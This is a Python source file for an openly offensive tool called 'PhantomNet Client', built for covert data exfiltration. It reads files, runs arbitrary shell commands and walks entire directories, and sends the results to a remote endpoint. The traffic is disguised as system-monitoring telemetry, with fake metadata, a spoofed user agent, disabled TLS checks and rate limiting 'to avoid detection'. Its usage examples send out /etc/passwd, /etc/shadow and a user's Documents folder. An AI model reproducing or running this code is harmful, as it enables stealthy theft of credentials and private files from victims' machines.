#!/usr/bin/env python3
"""
PhantomNet Client v2.2.0 - Advanced Covert Data Exfiltration
Ephemeral encryption with zero metadata leakage
"""

import os
import sys
import time
import json
import hashlib
import zlib
import base64
import secrets
import platform
import subprocess
from datetime import datetime
from typing import Optional, Dict, Any, Tuple

# ASCII Banner
BANNER = """
\033[95m
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝

  ███╗   ██╗███████╗████████╗
  ████╗  ██║██╔════╝╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║
  ██║╚██╗██║██╔══╝     ██║
  ██║ ╚████║███████╗   ██║
  ╚═╝  ╚═══╝╚══════╝   ╚═╝
\033[0m
\033[96m        PhantomNet Client v2.2.0 - Covert Exfiltration
        "Built by Shadowbyte"\033[0m
"""

def _import_crypto():
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding as crypto_padding
        from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
        from cryptography.hazmat.primitives import hashes, serialization
        return {
            'Cipher': Cipher,
            'algorithms': algorithms,
            'modes': modes,
            'backend': default_backend,
            'padding': crypto_padding,
            'rsa': rsa,
            'asym_padding': asym_padding,
            'hashes': hashes,
            'serialization': serialization
        }
    except ImportError:
        return None

def _import_network():
    try:
        import requests
        return requests
    except ImportError:
        return None


class EphemeralCrypto:
    """Ephemeral encryption - one-time keys only"""

    def __init__(self):
        self.crypto = _import_crypto()
        if not self.crypto:
            raise ImportError("Cryptography library required")

    def generate_ephemeral_key(self) -> bytes:
        """Generate random AES-256 key"""
        return secrets.token_bytes(32)

    def generate_ephemeral_keypair(self) -> Tuple[bytes, bytes]:
        """Generate ephemeral RSA keypair"""
        private_key = self.crypto['rsa'].generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=self.crypto['backend']()
        )

        public_key = private_key.public_key()

        private_pem = private_key.private_bytes(
            encoding=self.crypto['serialization'].Encoding.PEM,
            format=self.crypto['serialization'].PrivateFormat.PKCS8,
            encryption_algorithm=self.crypto['serialization'].NoEncryption()
        )

        public_pem = public_key.public_bytes(
            encoding=self.crypto['serialization'].Encoding.PEM,
            format=self.crypto['serialization'].PublicFormat.SubjectPublicKeyInfo
        )

        return private_pem, public_pem

    def encrypt_with_ephemeral_key(self, data: bytes) -> Dict[str, bytes]:
        """Encrypt with one-time key"""
        aes_key = self.generate_ephemeral_key()
        iv = secrets.token_bytes(16)

        # Pad data
        padder = self.crypto['padding'].PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt with ephemeral AES key
        cipher = self.crypto['Cipher'](
            self.crypto['algorithms'].AES(aes_key),
            self.crypto['modes'].CBC(iv),
            backend=self.crypto['backend']()
        )
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Generate ephemeral RSA keypair
        private_key_pem, public_key_pem = self.generate_ephemeral_keypair()

        private_key = self.crypto['serialization'].load_pem_private_key(
            private_key_pem,
            password=None,
            backend=self.crypto['backend']()
        )

        public_key = private_key.public_key()

        # Encrypt the ephemeral AES key with public key
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            self.crypto['asym_padding'].OAEP(
                mgf=self.crypto['asym_padding'].MGF1(algorithm=self.crypto['hashes'].SHA256()),
                algorithm=self.crypto['hashes'].SHA256(),
                label=None
            )
        )

        # Clear the AES key from memory
        aes_key = None
        del aes_key

        return {
            'encrypted_data': encrypted_data,
            'encrypted_key': encrypted_aes_key,
            'iv': iv,
            'private_key': private_key_pem,
            'public_key': public_key_pem
        }


class DataObfuscator:
    """Creates completely fake metadata - hides what's really being exfiltrated"""

    @staticmethod
    def generate_fake_metadata() -> Dict:
        """Generate ONLY fake metadata - absolutely no real data leaked"""

        import random

        fake_metrics = [
            {'type': 'cpu_usage', 'value': round(random.uniform(20.0, 80.0), 1), 'unit': 'percent'},
            {'type': 'memory_usage', 'value': round(random.uniform(40.0, 90.0), 1), 'unit': 'percent'},
            {'type': 'disk_io', 'value': random.randint(100, 2000), 'unit': 'kb/s'},
            {'type': 'network_traffic', 'value': random.randint(50, 1000), 'unit': 'kb/s'},
            {'type': 'process_count', 'value': random.randint(80, 200), 'unit': 'count'},
            {'type': 'uptime', 'value': random.randint(3600, 604800), 'unit': 'seconds'},
            {'type': 'swap_usage', 'value': round(random.uniform(0.0, 50.0), 1), 'unit': 'percent'},
            {'type': 'load_average', 'value': round(random.uniform(0.5, 4.0), 2), 'unit': 'load'},
        ]

        fake = random.choice(fake_metrics)

        # Return ONLY innocent data - NO real information whatsoever
        return {
            'metric_type': fake['type'],
            'metric_value': fake['value'],
            'metric_unit': fake['unit'],
            'collection_time': datetime.now().isoformat(),
            'interval': 300,
            'source': 'system_monitor'
        }


class SystemMetrics:
    """System metrics collector with maximum stealth"""

    def __init__(self, endpoint: str, stealth_mode: bool = True, show_banner: bool = True):
        if show_banner:
            print(BANNER)

        self.endpoint = endpoint
        self.session_id = self._generate_session_id()
        self.stealth_mode = stealth_mode

        try:
            self.crypto = EphemeralCrypto()
        except:
            self.crypto = None

        self._requests = _import_network()
        self.obfuscator = DataObfuscator()

    def _generate_session_id(self) -> str:
        """Generate session identifier"""
        timestamp = int(time.time())
        random_suffix = secrets.token_hex(4)
        return f"{timestamp}-{random_suffix}"

    def _compress_data(self, data: bytes) -> bytes:
        """Compress data to reduce bandwidth"""
        return zlib.compress(data, level=9)

    def _encode_for_transport(self, data: bytes) -> str:
        """Encode binary data for HTTP transport"""
        return base64.b64encode(data).decode('ascii')

    def _prepare_encrypted_payload(self, data: bytes, real_metadata: Dict) -> Dict[str, Any]:
        """
        Encrypt data + metadata together in one package
        Real metadata is NEVER visible in network traffic
        """

        if not self.crypto:
            # Fallback: no encryption (not recommended)
            return {
                'encrypted': False,
                'payload': self._encode_for_transport(data),
                'visible_metadata': real_metadata
            }

        # Create complete package with BOTH data and real metadata
        package = {
            'data': base64.b64encode(data).decode('ascii'),  # Encode for JSON
            'metadata': real_metadata
        }
        package_json = json.dumps(package)
        package_bytes = package_json.encode('utf-8')

        # Encrypt the ENTIRE package (data + metadata together)
        encrypted_package = self.crypto.encrypt_with_ephemeral_key(package_bytes)

        # Create transmission packet
        packet = {
            'encrypted': True,
            'ephemeral_crypto': True,
            'encrypted_data': self._encode_for_transport(encrypted_package['encrypted_data']),
            'encrypted_key': self._encode_for_transport(encrypted_package['encrypted_key']),
            'iv': self._encode_for_transport(encrypted_package['iv']),
            'private_key': self._encode_for_transport(encrypted_package['private_key']),
            'public_key': self._encode_for_transport(encrypted_package['public_key'])
        }

        # Add ONLY fake metadata (visible in network traffic)
        if self.stealth_mode:
            packet['visible_metadata'] = self.obfuscator.generate_fake_metadata()
        else:
            # Even in non-stealth mode, don't leak sensitive info
            packet['visible_metadata'] = {
                'type': 'diagnostic',
                'timestamp': int(time.time())
            }

        return packet

    def collect_system_info(self) -> Dict[str, Any]:
        """Collect basic system information"""
        return {
            'hostname': platform.node(),
            'platform': platform.system(),
            'architecture': platform.machine(),
            'python_version': platform.python_version(),
            'timestamp': datetime.now().isoformat()
        }

    def send_diagnostic_data(self, data: bytes, real_metadata: Dict, silent: bool = False) -> bool:
        """Send diagnostic data with maximum stealth"""

        if not self._requests:
            return False

        try:
            # Prepare telemetry packet
            telemetry = {
                'session_id': self.session_id,
                'timestamp': int(time.time()),
                'type': 'diagnostic',
                'system_info': self.collect_system_info()
            }

            # Compress data first
            compressed = self._compress_data(data)

            # Encrypt data + real metadata together (nothing leaked)
            encrypted_payload = self._prepare_encrypted_payload(compressed, real_metadata)
            telemetry.update(encrypted_payload)

            telemetry['payload_size'] = len(compressed)

            # Send via HTTP POST
            response = self._requests.post(
                self.endpoint,
                json=telemetry,
                headers={
                    'User-Agent': f'SystemMonitor/{platform.python_version()}',
                    'Content-Type': 'application/json',
                    'X-Session-ID': self.session_id
                },
                timeout=30,
                verify=False  # Skip SSL verification
            )

            if not silent:
                if self.stealth_mode:
                    # Show fake progress (looks like system monitoring)
                    fake_meta = telemetry.get('visible_metadata', {})
                    metric_type = fake_meta.get('metric_type', 'unknown')
                    print(f"\033[92m[+] Collected metric: {metric_type}\033[0m")
                else:
                    print(f"\033[92m[+] Sent diagnostic data\033[0m")

            return response.status_code == 200

        except Exception as e:
            if not silent:
                print(f"\033[91m[!] Network error\033[0m")
            return False

    def exfiltrate_file(self, filepath: str, silent: bool = False) -> bool:
        """Exfiltrate file with stealth"""

        if not os.path.exists(filepath):
            if not silent:
                print(f"\033[91m[!] File not found\033[0m")
            return False

        try:
            with open(filepath, 'rb') as f:
                content = f.read()

            # Real metadata - will be ENCRYPTED and hidden
            real_metadata = {
                'filename': os.path.basename(filepath),
                'size': len(content),
                'full_path': filepath,
                'modified': os.path.getmtime(filepath),
                'type': 'file_exfiltration'
            }

            return self.send_diagnostic_data(content, real_metadata, silent)

        except Exception as e:
            if not silent:
                print(f"\033[91m[!] Error reading file\033[0m")
            return False

    def exfiltrate_command(self, command: str, silent: bool = False) -> bool:
        """Exfiltrate command output with stealth"""

        try:
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            )

            real_metadata = {
                'command': command,
                'exit_code': 0,
                'type': 'command_output',
                'size': len(result)
            }

            return self.send_diagnostic_data(result, real_metadata, silent)

        except subprocess.CalledProcessError as e:
            real_metadata = {
                'command': command,
                'exit_code': e.returncode,
                'type': 'command_error'
            }
            return self.send_diagnostic_data(e.output, real_metadata, silent)
        except subprocess.TimeoutExpired:
            if not silent:
                print(f"\033[91m[!] Command timeout\033[0m")
            return False
        except Exception as e:
            if not silent:
                print(f"\033[91m[!] Command error\033[0m")
            return False

    def exfiltrate_directory(self, directory: str, silent: bool = True) -> bool:
        """Exfiltrate entire directory recursively"""

        if not os.path.exists(directory):
            return False

        success_count = 0
        fail_count = 0

        for root, dirs, files in os.walk(directory):
            for filename in files:
                filepath = os.path.join(root, filename)

                # Skip large files (>10MB)
                try:
                    if os.path.getsize(filepath) > 10 * 1024 * 1024:
                        continue
                except:
                    continue

                # Skip system files
                if filename.startswith('.'):
                    continue

                if self.exfiltrate_file(filepath, silent=True):
                    success_count += 1
                else:
                    fail_count += 1

                # Rate limit to avoid detection
                time.sleep(0.1)

        if not silent:
            print(f"\033[92m[+] Collected {success_count} samples\033[0m")
            if fail_count > 0:
                print(f"\033[91m[!] Failed: {fail_count}\033[0m")

        return success_count > 0


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='PhantomNet Client v2.2.0 - Covert Data Exfiltration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Stealth mode (default) - hides what you're exfiltrating
  python3 client.py --endpoint http://server:8080 --file /etc/passwd

  # Exfiltrate command output silently
  python3 client.py --endpoint http://server:8080 --command "cat /etc/shadow" --silent

  # Exfiltrate entire directory (completely silent)
  python3 client.py --endpoint http://server:8080 --directory /home/user/Documents --silent

  # Normal mode (still encrypts, but less fake metadata)
  python3 client.py --endpoint http://server:8080 --file data.txt --no-stealth
        """
    )

    parser.add_argument('--endpoint', required=True, help='Server endpoint URL')
    parser.add_argument('--file', help='Exfiltrate file')
    parser.add_argument('--command', help='Exfiltrate command output')
    parser.add_argument('--directory', help='Exfiltrate entire directory recursively')
    parser.add_argument('--stealth', action='store_true', default=True, help='Maximum stealth mode (default)')
    parser.add_argument('--no-stealth', action='store_true', help='Disable stealth (not recommended)')
    parser.add_argument('--silent', action='store_true', help='No output (completely silent)')
    parser.add_argument('--no-banner', action='store_true', help='Hide banner')

    args = parser.parse_args()

    client = SystemMetrics(
        endpoint=args.endpoint,
        stealth_mode=not args.no_stealth,
        show_banner=not args.no_banner and not args.silent
    )

    if args.file:
        success = client.exfiltrate_file(args.file, args.silent)
        if not args.silent:
            if success:
                print(f"\033[92m[+] Success\033[0m")
            else:
                print(f"\033[91m[!] Failed\033[0m")
        sys.exit(0 if success else 1)

    elif args.command:
        success = client.exfiltrate_command(args.command, args.silent)
        if not args.silent:
            if success:
                print(f"\033[92m[+] Success\033[0m")
            else:
                print(f"\033[91m[!] Failed\033[0m")
        sys.exit(0 if success else 1)

    elif args.directory:
        success = client.exfiltrate_directory(args.directory, args.silent)
        if not args.silent:
            if success:
                print(f"\033[92m[+] Success\033[0m")
        sys.exit(0 if success else 1)

    else:
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    main()
